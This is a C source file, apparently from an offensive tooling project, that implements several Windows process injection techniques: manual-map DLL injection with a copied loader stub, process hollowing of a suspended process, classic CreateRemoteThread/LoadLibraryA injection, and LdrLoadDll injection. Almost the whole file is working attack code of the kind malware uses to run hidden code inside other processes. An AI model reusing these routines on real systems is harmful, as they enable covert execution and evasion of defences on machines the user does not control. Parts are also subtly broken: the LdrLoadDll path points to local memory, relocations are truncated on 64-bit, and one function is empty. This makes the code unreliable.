#include "Techniques.h"
#include "macros.h"
#include "structs.h"


DWORD __stdcall MM_Loader(DllInfos* data)
{
	PIMAGE_THUNK_DATA FirstThunk = NULL;
	PIMAGE_THUNK_DATA OriginalFirstThunk = NULL;
	PIMAGE_IMPORT_BY_NAME pImportByName = NULL;
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = NULL;
	HMODULE hMod;
	void* modFunc;
	dllmain entryPointOfDll = 0;


	while (data->ImportDirectory->Characteristics) {
		OriginalFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)data->remoteBase + data->ImportDirectory->OriginalFirstThunk);
		FirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)data->remoteBase + data->ImportDirectory->FirstThunk);

		hMod = data->fnLoadLibraryA((LPCSTR)data->remoteBase + data->ImportDirectory->Name);
		if (!hMod) {
			return FALSE;
		}

		while (OriginalFirstThunk->u1.AddressOfData) {
			if (OriginalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
				modFunc = (void*)data->fnGetProcAddress(hMod, (LPCSTR)(OriginalFirstThunk->u1.Ordinal & 0xFFFF));
			}
			else {
				pImportByName = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)data->remoteBase + OriginalFirstThunk->u1.AddressOfData);
				modFunc = (void*)data->fnGetProcAddress(hMod, (LPCSTR)pImportByName->Name);
			}

			if (!modFunc) {
				return FALSE;
			}
			FirstThunk->u1.Function = modFunc;

			OriginalFirstThunk++;
			FirstThunk++;
		}
		data->ImportDirectory++;
	}

	if (data->NtHeaders->OptionalHeader.AddressOfEntryPoint) {
		entryPointOfDll = (dllmain)((LPBYTE)data->remoteBase + data->NtHeaders->OptionalHeader.AddressOfEntryPoint);
		entryPointOfDll((HMODULE)data->remoteBase, DLL_PROCESS_ATTACH, NULL);
	}
}

DWORD __stdcall LDR_Loader(LDR_DATA* data)
{
	HANDLE hModule = NULL;
	pLdrLoadDll pLdr = data->LdrLoadDll_addr;
	pLdr(NULL, 0, &data->path, hModule);
}



int ManualMappingDllInjection(peinfos infos, DWORD PID)
{
	const BYTE* baseAddress = infos.pe;

	okay("Getting Handle To The Process --------");
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess)
	{
		error("Failed To Open Process");
	}
	okay("Got Handle To Process 0x%p", hProcess);
	BYTE* remoteBase = VirtualAllocEx(hProcess, (void*)infos.ntHeader->OptionalHeader.ImageBase, infos.ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (remoteBase == NULL)
	{
		remoteBase = VirtualAllocEx(hProcess, NULL, infos.ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (remoteBase == NULL)
		{
			error("Failed To Allocate Space In the target process");
		}
		okay("Allocated Space In the Target Process At 0x%p", remoteBase);


	}
	else okay("Allocated Space In the Target Process At 0x%p", remoteBase);

	if (!WriteProcessMemory(hProcess, remoteBase, baseAddress, infos.ntHeader->OptionalHeader.SizeOfHeaders, NULL))
	{
		error("Failed To Write Headers Into Target Process (0x%p)", GetLastError());
		return -1;
	}
	okay("Headers Written Into Target Process");
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(infos.ntHeader);
	for (int i = 0; i != infos.ntHeader->FileHeader.NumberOfSections; i++, sectionHeader++)
	{
		if (!WriteProcessMemory(hProcess, remoteBase + sectionHeader->VirtualAddress, baseAddress + sectionHeader->PointerToRawData, sectionHeader->SizeOfRawData, NULL))
		{
			error("Failed To Write Section %s Into Target Process", sectionHeader->Name);
			VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
			CloseHandle(hProcess);
			return -1;
		}
		okay("Section %s Written Into Target Process ", sectionHeader->Name);

	}
	//Base Relocations
	okay("Now Preforming base relocations --------");
	DWORD relocDirSize = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
	DWORD relocRVA = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	DWORD Delta = (DWORD)(remoteBase - infos.ntHeader->OptionalHeader.ImageBase);
	IMAGE_DATA_DIRECTORY relocDir = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	if (Delta != 0)
	{
		okay("Delta is not zero Base Relocations Needed (0x%p)", Delta);

		DWORD bytesRead;

		IMAGE_BASE_RELOCATION* relocData = (IMAGE_BASE_RELOCATION*)malloc(relocDirSize);

		if (!ReadProcessMemory(hProcess, remoteBase + relocRVA, relocData, relocDirSize, &bytesRead) || bytesRead != relocDirSize) {
			printf("[-] Failed to read relocation data\n");
			free(relocData);
			return;
		}
		IMAGE_BASE_RELOCATION* currentBlock = relocData;
		while ((DWORD)currentBlock < (DWORD)relocData + relocDirSize && currentBlock->SizeOfBlock)
		{
			DWORD entriesCount = (currentBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			WORD* entries = (WORD*)(currentBlock + 1);

			for (DWORD i = 0; i < entriesCount; i++)
			{
				if (entries[i] >> 12 == IMAGE_REL_BASED_HIGHLOW)
				{
					DWORD rva = currentBlock->VirtualAddress + (entries[i] & 0xFFF);
					DWORD value;
					if (!ReadProcessMemory(hProcess, remoteBase + rva, &value, sizeof(DWORD), NULL)) {
						printf("[-] Failed to read relocation target\n");
						continue;
					}
					value += Delta;

					if (!WriteProcessMemory(hProcess, remoteBase + rva, &value, sizeof(DWORD), NULL)) {
						printf("[-] Failed to write relocation\n");
					}


				}
			}
			currentBlock = (IMAGE_BASE_RELOCATION*)((BYTE*)currentBlock + currentBlock->SizeOfBlock);
		}
		free(relocData);
		okay("Preformed Base Relocations");

	}
	else
	{
		okay("No Relocations Needed Delta (0x%p)", Delta);
	}

	DllInfos data;
	data.fnGetProcAddress = GetProcAddress;
	data.fnLoadLibraryA = LoadLibraryA;
	data.remoteBase = remoteBase;
	data.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)(remoteBase + infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	data.NtHeaders = (PIMAGE_NT_HEADERS)(remoteBase + infos.dosHeader->e_lfanew);

	BYTE* stubAddress = VirtualAllocEx(hProcess, NULL, 0x1000 + sizeof(DllInfos), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (stubAddress == NULL)
	{
		error("Failed To Allocate Space For The Stub %d %p", GetLastError(), hProcess);
		VirtualFreeEx(hProcess, stubAddress, 0, MEM_RELEASE);
		VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
		CloseHandle(hProcess);
	}
	else
	{
		okay("Space Allocated For The Stub");
	}
	if (!WriteProcessMemory(hProcess, stubAddress, &data, sizeof(DllInfos), NULL))
	{
		error("Failed To Write The Stub Data");
	}
	if (!WriteProcessMemory(hProcess, (void*)((DllInfos*)stubAddress + 1), MM_Loader, 0x1000, NULL))
	{
		error("Failed To Write The Stub");
	}
	else
	{
		okay("Stub And Params Written Into The Target Process");
	}
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DllInfos*)stubAddress + 1), stubAddress, 0, NULL);
	if (hThread == NULL)
	{
		error("Failed To Create Remote Thread");
		VirtualFreeEx(hProcess, stubAddress, 0, MEM_RELEASE);
		VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
		CloseHandle(hThread);
		CloseHandle(hProcess);
	}
	else
	{
		okay("Stub Remote Thread Created");
	}
	WaitForSingleObject(hThread, INFINITE);
}

int ProcessHollowing(peinfos infos, char* path)
{

	int errorcount;
	int HIGHLOW = 0;
	int x64 = 0;
	int absolute = 0;
	BYTE* BaseAddress = infos.pe;
	NtUnmapViewOfSection_t NtUnmapViewOfSection = NULL;
	NtQueryInformationProcess_t NtQueryInformationProcess = NULL;
	//okay("0x%p", infos.ntHeader->OptionalHeader.DataDirectory[1].VirtualAddress);
	//infos.ntHeader->OptionalHeader.DataDirectory[1].VirtualAddress = 0x00000000000038F8;

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);
	_PROCESS_BASIC_INFORMATION pbi;
	PVOID baseAddress = NULL;
	BYTE* NewAddress = NULL;

	HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
	if (hNtDll == NULL)
	{
		error("Failed To Get NtDll Handle");
		return -1;
	}
	okay("Got Handle To NtDll");
	if (!CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {

		error("CreateProcessA failed: %lu", GetLastError());
		return -1;
	}

	okay("Process Created In A susspeneded State PID(%d)", pi.dwProcessId);
	NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtDll, "NtQueryInformationProcess");
	if (!NtQueryInformationProcess) {
		error("Failed To Get NtQueryInformationProcess Address");
		return -1;
	}

	NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
	if (status != 0) {
		error("Failed To Read Process Informations (NTSTATUS: 0x%X)", status);
	}
	okay("Got Peb BASEADDRESS(0x%p)", pbi.PebBaseAddress);

	//
	if (!pbi.PebBaseAddress) {
		error("PEB Base Address is NULL");
	}

	if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &baseAddress, sizeof(PVOID), NULL)) {
		error("Failed to read ImageBaseAddress from target PEB");
	}
	okay("Remote Image Base Address Is 0x%p", baseAddress);




	NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(hNtDll, "NtUnmapViewOfSection");
	if (NtUnmapViewOfSection == NULL)
	{
		error("Failed To Get NtUnmapViewOfSection address");
		return -1;
	}
	//g
	status = NtUnmapViewOfSection(pi.hProcess, baseAddress);
	if (status != 0) {
		error("Failed To Unmap Process base address section (NTSTATUS: 0x%X)", status);
	}
	okay("Unmapped The Target process");
	NewAddress = VirtualAllocEx(pi.hProcess, baseAddress, infos.ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (NewAddress == NULL)
	{
		error("Failed to allocate space at the unmapped address");
	}
	okay("Allocated Space At 0x%p", NewAddress);
	WriteProcessMemory(pi.hProcess, NewAddress, infos.pe, infos.ntHeader->OptionalHeader.SizeOfHeaders, NULL);
	okay("Headers Written Into Target Process");
	PIMAGE_SECTION_HEADER sectionHeader = infos.sectionHeader;
	okay("Found %d Sections", infos.ntHeader->FileHeader.NumberOfSections);
	for (int i = 0; i != infos.ntHeader->FileHeader.NumberOfSections; i++, sectionHeader++)
	{
		if (!WriteProcessMemory(pi.hProcess, NewAddress + sectionHeader->VirtualAddress, infos.pe + sectionHeader->PointerToRawData, sectionHeader->SizeOfRawData, NULL))
		{
			error("Failed To Write Section %d Into Hollowed Process", i);
		}
		else
		{
			okay("Section %s Written At 0x%p", sectionHeader->Name, sectionHeader->VirtualAddress);
		}
	}
	okay("Sections Written Into Target Process");
	//Base Relocations
	okay("Now Preforming base relocations --------");
	DWORD relocDirSize = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
	DWORD relocRVA = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	DWORD Delta = (DWORD)(NewAddress - infos.ntHeader->OptionalHeader.ImageBase);
	IMAGE_DATA_DIRECTORY relocDir = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	if (Delta != 0)
	{
		okay("Delta is not zero Base Relocations Needed (0x%p)", Delta);

		DWORD bytesRead;

		IMAGE_BASE_RELOCATION* relocData = (IMAGE_BASE_RELOCATION*)malloc(relocDirSize);

		if (!ReadProcessMemory(pi.hProcess, NewAddress + relocRVA, relocData, relocDirSize, &bytesRead) || bytesRead != relocDirSize) {
			printf("[-] Failed to read relocation data\n");
			free(relocData);
			return;
		}
		IMAGE_BASE_RELOCATION* currentBlock = relocData;
		while ((DWORD)currentBlock < (DWORD)relocData + relocDirSize && currentBlock->SizeOfBlock)
		{
			DWORD entriesCount = (currentBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			WORD* entries = (WORD*)(currentBlock + 1);

			for (DWORD i = 0; i < entriesCount; i++)
			{
				if (entries[i] >> 12 == IMAGE_REL_BASED_HIGHLOW)
				{
					DWORD rva = currentBlock->VirtualAddress + (entries[i] & 0xFFF);
					DWORD value;
					if (!ReadProcessMemory(pi.hProcess, NewAddress + rva, &value, sizeof(DWORD), NULL)) {
						printf("[-] Failed to read relocation target\n");
						continue;
					}
					value += Delta;

					if (!WriteProcessMemory(pi.hProcess, NewAddress + rva, &value, sizeof(DWORD), NULL)) {
						printf("[-] Failed to write relocation\n");
					}


				}
			}
			currentBlock = (IMAGE_BASE_RELOCATION*)((BYTE*)currentBlock + currentBlock->SizeOfBlock);
		}
		free(relocData);
		okay("Preformed Base Relocations");

	}
	else
	{
		okay("No Relocations Needed Delta (0x%p)", Delta);
	}

	CONTEXT ctx;
	ZeroMemory(&ctx, sizeof(CONTEXT));
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(pi.hThread, &ctx)) {
		error("GetThreadContext failed: %lu\n", GetLastError());
		return -1;
	}

	okay("Got Thread Context");
	printf("[+] Original EIP: 0x%08lx\n", ctx.Rip);
	ctx.Rip = (DWORD_PTR)(NewAddress + infos.ntHeader->OptionalHeader.AddressOfEntryPoint);
	okay("Address Of Entry Point 0x%p ADDRESS (0x%p)", infos.ntHeader->OptionalHeader.AddressOfEntryPoint, NewAddress);

	printf("[+] Thread context updated. New EIP: 0x%08X\n", ctx.Rip);

	if (!SetThreadContext(pi.hThread, &ctx)) {
		error("SetThreadContext failed: %lu\n", GetLastError());
		return -1;
	}
	okay("About to resume thread with entry point at: 0x%p",
		NewAddress + infos.ntHeader->OptionalHeader.AddressOfEntryPoint);

	if (ResumeThread(pi.hThread) == (DWORD)-1) {
		error("Failed to resume thread: %lu\n", GetLastError());
		return -1;
	}
	okay("Thread Resumed");
	WaitForSingleObjectEx(pi.hThread, INFINITE, FALSE);
	DWORD exitCode;
	if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
		printf("Process exited with code: 0x%X\n", exitCode);
	}
	return 0;

}

int NormalDllInjection(char *path, DWORD PID)
{

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess)
	{
		error("Failed To Open Process ");
	}
	okay("Got Handle To Process (%d)", PID);
	BYTE* remoteAddr = VirtualAllocEx(hProcess, NULL, strlen(path) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (remoteAddr == NULL)
	{
		error("Failed To allocate Space for The Dll Path");
	}
	okay("Allocated Space In the remote Process Memory (0x%p)",remoteAddr);
	if (!WriteProcessMemory(hProcess, remoteAddr, path, strlen(path) + 1 , NULL))
	{
		error("Failed To Write The Dll Path Into The Target Process Memory");
	}
	okay("Wrote Dll Path To target Memory");
	PTHREAD_START_ROUTINE threatStartRoutineAddress = (LPTHREAD_START_ROUTINE)LoadLibraryA;
	getchar();
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, threatStartRoutineAddress, remoteAddr, 0, NULL);
	if (!hThread)
	{
		error("Failed To Create Remote Thread (%d)", GetLastError());
	}
	okay("Thread Created");
	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hProcess);
	CloseHandle(hThread);
}

int LdrLoadDll_Injection(char *path, DWORD PID)
{
	WCHAR wpath[MAX_PATH];
	UNICODE_STRING ustr;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (!ntdll) {
		error("Failed To Get Handle To Ntdll");

	}
	if (!hProcess)
	{
		error("Failed To Open Process");
	}
	okay("Got Handle To Process");
	

	RtlInitUnicodeString_t pRtlInitUnicodeString =
		(RtlInitUnicodeString_t)GetProcAddress(ntdll, "RtlInitUnicodeString");

	if (MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, MAX_PATH) == 0) {
		error("MultiByteToWideChar failed");
		return;
	}
	pRtlInitUnicodeString(&ustr, wpath);


	
	

	pLdrLoadDll LdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
	if (!LdrLoadDll) return -1;
	LDR_DATA data;
	data.LdrLoadDll_addr = LdrLoadDll;
	data.path = ustr;
	BYTE* remoteAddr = VirtualAllocEx(hProcess, NULL, 500 + sizeof(LDR_DATA), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (remoteAddr == NULL)
	{
		error("Failed To Allocate Space For LdrLoadDll Stub");
	}
	if (!WriteProcessMemory(hProcess,remoteAddr,&data,sizeof(LDR_DATA),NULL))
	{
		error("Failed To Write Stub Infos");
	}
	okay("Stub Required Data Written");
	if (!WriteProcessMemory(hProcess, (void*)((LDR_DATA*)remoteAddr + 1), LDR_Loader, 500, NULL))
	{
		error("Failed To Write Stub");
	}
	okay("Stub Written");
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((LDR_DATA*)remoteAddr + 1), remoteAddr, 0, NULL);
	if (!hThread)
	{
		error("Failed To Create Remote Thread");
	}
	else
	{
		okay("Remote Thread Created  ENJOY ;) ");
		WaitForSingleObject(hThread, INFINITE);
	}


}

int pLdrLoadDll_injection(char* path, DWORD PID)
{

}